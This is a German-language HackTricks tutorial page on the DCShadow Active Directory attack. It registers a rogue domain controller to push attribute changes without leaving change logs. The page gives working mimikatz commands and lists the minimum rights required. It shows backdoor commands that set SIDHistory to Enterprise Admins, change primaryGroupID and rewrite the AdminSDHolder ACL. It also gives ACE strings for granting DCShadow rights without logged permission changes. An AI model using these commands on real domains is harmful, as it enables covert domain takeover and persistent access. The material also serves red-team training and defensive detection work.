{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}


# DCShadow

Es registriert einen **neuen Domänencontroller** im AD und verwendet ihn, um **Attribute** (SIDHistory, SPNs...) an bestimmten Objekten **ohne** das Hinterlassen von **Protokollen** bezüglich der **Änderungen** zu **pushen**. Sie **benötigen DA**-Berechtigungen und müssen sich im **Root-Domain** befinden.\
Beachten Sie, dass bei Verwendung falscher Daten ziemlich hässliche Protokolle erscheinen werden.

Um den Angriff durchzuführen, benötigen Sie 2 Mimikatz-Instanzen. Eine davon startet die RPC-Server mit SYSTEM-Berechtigungen (hier müssen Sie die Änderungen angeben, die Sie durchführen möchten), und die andere Instanz wird verwendet, um die Werte zu pushen:

{% code title="mimikatz1 (RPC-Server)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Benötigt DA oder ähnliches" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Beachten Sie, dass **`elevate::token`** in der `mimikatz1`-Sitzung nicht funktioniert, da dies die Berechtigungen des Threads erhöht, wir jedoch die **Berechtigung des Prozesses** erhöhen müssen.\
Sie können auch ein "LDAP"-Objekt auswählen: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Sie können die Änderungen von einem DA oder von einem Benutzer mit diesen minimalen Berechtigungen vornehmen:

* Im **Domänenobjekt**:
* _DS-Install-Replica_ (Replica in der Domäne hinzufügen/entfernen)
* _DS-Replication-Manage-Topology_ (Replikations-Topologie verwalten)
* _DS-Replication-Synchronize_ (Replikationssynchronisation)
* Das **Standorte-Objekt** (und seine Kinder) im **Konfigurationscontainer**:
* _CreateChild und DeleteChild_
* Das Objekt des **Computers, der als DC registriert ist**:
* _WriteProperty_ (Nicht Schreiben)
* Das **Zielobjekt**:
* _WriteProperty_ (Nicht Schreiben)

Sie können [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) verwenden, um diese Berechtigungen einem unprivilegierten Benutzer zu geben (beachten Sie, dass dies einige Protokolle hinterlässt). Dies ist viel restriktiver als DA-Berechtigungen zu haben.\
Zum Beispiel: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Das bedeutet, dass der Benutzername _**student1**_ beim Anmelden an der Maschine _**mcorp-student1**_ DCShadow-Berechtigungen über das Objekt _**root1user**_ hat.

## Verwendung von DCShadow zur Erstellung von Hintertüren

{% code title="Set Enterprise Admins in SIDHistory to a user" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Ändere PrimaryGroupID (füge Benutzer als Mitglied der Domänenadministratoren hinzu)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Ändern des ntSecurityDescriptor von AdminSDHolder (Vollzugriff für einen Benutzer gewähren)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Geben Sie DCShadow Berechtigungen mit DCShadow (keine modifizierten Berechtigungsprotokolle)

Wir müssen die folgenden ACEs mit der SID unseres Benutzers am Ende anhängen:

* Am Domänenobjekt:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Am Angreifer-Computerobjekt: `(A;;WP;;;UserSID)`
* Am Zielbenutzerobjekt: `(A;;WP;;;UserSID)`
* Am Sites-Objekt im Konfigurationscontainer: `(A;CI;CCDC;;;UserSID)`

Um den aktuellen ACE eines Objekts zu erhalten: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Beachten Sie, dass Sie in diesem Fall **mehrere Änderungen** vornehmen müssen, nicht nur eine. Verwenden Sie also im **mimikatz1-Sitzung** (RPC-Server) den Parameter **`/stack` mit jeder Änderung**, die Sie vornehmen möchten. Auf diese Weise müssen Sie nur einmal **`/push`** verwenden, um alle gestapelten Änderungen auf dem Rouge-Server durchzuführen.

[**Weitere Informationen zu DCShadow auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
